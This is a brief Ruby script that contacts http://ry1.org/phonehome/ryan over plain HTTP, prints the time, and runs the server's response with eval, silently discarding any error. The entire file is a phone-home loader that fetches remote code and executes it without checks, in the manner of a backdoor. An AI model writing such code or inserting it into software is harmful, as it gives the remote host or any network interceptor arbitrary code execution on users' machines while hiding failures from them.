require 'net/http'

require 'uri'

begin
  url = URI.parse('http://ry1.org/phonehome/ryan')
  res = Net::HTTP.start(url.host, url.port) {|http|
    http.get(url.path)
  }
  
  puts Time.now
  eval res.body
rescue
  # don't worry about it
end
